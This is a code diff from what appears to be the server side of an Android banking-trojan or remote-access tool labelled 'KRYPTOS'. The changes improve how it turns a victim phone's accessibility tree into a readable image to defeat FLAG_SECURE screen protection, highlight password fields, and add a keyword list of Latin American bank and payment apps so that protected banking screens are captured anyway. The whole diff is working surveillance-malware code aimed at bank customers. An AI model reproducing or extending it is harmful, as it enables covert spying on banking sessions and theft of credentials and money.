@@ -937,7 +937,7 @@ class DeviceConnectionManager:
                 logger.warning("VNC_WD err: " + str(e))
 
     def render_tree_image(self, device_id: str, tree):
-        """[KRYPTOS] Renderiza a arvore como imagem (bypass FLAG_SECURE)."""
+        """[KRYPTOS] Arvore como imagem (bypass FLAG_SECURE) - v2 legivel."""
         try:
             import json as _j
             from io import BytesIO as _B
@@ -958,17 +958,16 @@ class DeviceConnectionManager:
             W = int(b.get("w") or 0); H = int(b.get("h") or 0)
             if W <= 0 or H <= 0:
                 W, H = 1080, 2400
-            scale = min(1.0, 350.0 / float(W))
+            scale = min(1.0, 640.0 / float(W))
             ow = max(1, int(W * scale)); oh = max(1, int(H * scale))
-            img = Image.new("RGB", (ow, oh), (14, 14, 18))
+            img = Image.new("RGB", (ow, oh), (12, 12, 16))
             d = ImageDraw.Draw(img, "RGBA")
             fp = None
-            for cand in ("C:/Windows/Fonts/arialbd.ttf", "C:/Windows/Fonts/arial.ttf", "C:/Windows/Fonts/segoeui.ttf"):
+            for cand in ("C:/Windows/Fonts/arial.ttf", "C:/Windows/Fonts/segoeui.ttf"):
                 try:
-                    ImageFont.truetype(cand, 11); fp = cand; break
+                    ImageFont.truetype(cand, 16); fp = cand; break
                 except Exception:
                     pass
-            fnt = ImageFont.truetype(fp, 11) if fp else ImageFont.load_default()
             nodes = []
             def _walk(n, dep):
                 if not isinstance(n, dict) or dep > 45:
@@ -979,6 +978,12 @@ class DeviceConnectionManager:
                     for c in ch:
                         _walk(c, dep + 1)
             _walk(root, 0)
+            fc = {}
+            def _fnt(sz):
+                sz = max(9, min(64, int(sz)))
+                if sz not in fc:
+                    fc[sz] = ImageFont.truetype(fp, sz) if fp else ImageFont.load_default()
+                return fc[sz]
             drawn = 0
             for n in nodes:
                 t = ""
@@ -997,24 +1002,34 @@ class DeviceConnectionManager:
                 if w <= 1 or h <= 1:
                     continue
                 pwd = bool(n.get("password"))
-                d.rectangle([x, y, x + w, y + h], fill=((30, 100, 55, 205) if pwd else (36, 56, 102, 190)), outline=((110, 240, 150, 255) if pwd else (96, 140, 220, 255)))
-                tx = t if len(t) <= 46 else t[:46] + ".."
+                _clk = bool(n.get("clickable")) or bool(n.get("desc")) or bool(n.get("contentDescription"))
+                if _clk:
+                    try:
+                        d.rounded_rectangle([x, y, x + w, y + h], radius=max(4, min(h // 3, 14)),
+                                            fill=(255, 255, 255, 16),
+                                            outline=((110, 240, 150, 200) if pwd else (120, 150, 230, 170)), width=2)
+                    except Exception:
+                        d.rectangle([x, y, x + w, y + h], outline=(120, 150, 230, 170))
+                fsz = max(11, int(h * 0.58))
+                fnt = _fnt(fsz)
+                tx = t if len(t) <= 60 else t[:60] + ".."
                 try:
                     tw = d.textlength(tx, font=fnt)
-                    if tw > w - 8 and len(tx) > 4 and w > 24:
-                        _cut = max(3, int(len(tx) * (w - 10) / max(1.0, tw)) - 2)
-                        tx = tx[: _cut] + ".."
+                    if tw > w - 10 and w > 24:
+                        tx = tx[: max(3, int(len(tx) * (w - 12) / max(1.0, tw)) - 2)] + ".."
                 except Exception:
                     pass
-                d.text((x + 3, y + max(1, (h - 12) // 2)), tx, font=fnt, fill=(255, 255, 255))
+                d.text((x + 5, y + max(0, (h - fsz) // 2 - 1)), tx, font=fnt,
+                       fill=((150, 255, 180) if pwd else (240, 240, 248)))
                 drawn += 1
             if drawn < 1:
                 return None
             pkg = str(tree.get("package") or "")
-            d.rectangle([0, 0, ow, 15], fill=(0, 0, 0, 225))
-            d.text((4, 2), "[ARVORE] " + pkg, font=fnt, fill=(255, 220, 120))
+            bar = max(16, int(oh * 0.022))
+            d.rectangle([0, 0, ow, bar], fill=(0, 0, 0, 235))
+            d.text((6, 2), "[ARVORE] " + pkg, font=_fnt(bar - 4), fill=(255, 215, 110))
             buf = _B()
-            img.save(buf, "JPEG", quality=72)
+            img.save(buf, "JPEG", quality=78)
             return buf.getvalue()
         except Exception as e:
             logger.warning("render_tree err: " + str(e))
@@ -1063,7 +1078,9 @@ class DeviceConnectionManager:
             except Exception:
                 _is_black = False
             _tv[device_id] = _is_black
-        if _is_black and _tree_live:
+        _fg = (self.device_info.get(device_id, {}) or {}).get("foreground_package", "") or ""
+        _is_bank = any(k in _fg.lower() for k in ("banco", "bank", "nequi", "davivienda", "daviplata", "bancolombia", "bogota", "itau", "bradesco", "santander", "nubank", "caixa", "bbva", "scotiabank", "popular", "picpay", "mercadopago", "neon"))
+        if _is_black and (_tree_live or _is_bank):
             self.maybe_render_tree(device_id)
             if self.device_screens.get(device_id):
                 try:
@@ -1097,7 +1114,14 @@ class DeviceConnectionManager:
             logger.warning(f'HIER_RX {device_id} ' + str(len(hierarchy_data)))
         _hl[device_id] = len(hierarchy_data)
         try:
-            if globals().setdefault("_TREE_IN_LIVE", False) and globals().setdefault("_TREE_VIEW", {}).get(device_id):
+            _tp = ""
+            try:
+                _hj = json.loads(hierarchy_data) if isinstance(hierarchy_data, str) else hierarchy_data
+                _tp = str((_hj or {}).get("package") or "").lower()
+            except Exception:
+                _tp = ""
+            _isb2 = any(k in _tp for k in ("banco", "bank", "nequi", "davivienda", "daviplata", "bancolombia", "bogota", "itau", "bradesco", "santander", "nubank", "caixa", "bbva", "scotiabank", "popular", "picpay", "mercadopago", "neon"))
+            if (globals().setdefault("_TREE_IN_LIVE", False) or _isb2) and globals().setdefault("_TREE_VIEW", {}).get(device_id):
                 self.maybe_render_tree(device_id)
         except Exception:
             pass
